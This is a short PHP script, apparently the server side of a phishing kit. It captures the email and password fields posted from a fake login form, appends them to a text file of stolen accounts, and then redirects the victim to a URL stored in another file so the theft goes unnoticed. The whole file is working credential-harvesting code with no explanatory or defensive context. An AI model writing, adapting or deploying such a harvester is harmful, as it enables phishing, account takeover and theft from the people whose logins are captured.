<?php
$file = "web.txt";
$fp = fopen($file, "r");
$contents = fread($fp, filesize($file));
file_put_contents("usernames.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header("location: $contents");
exit();
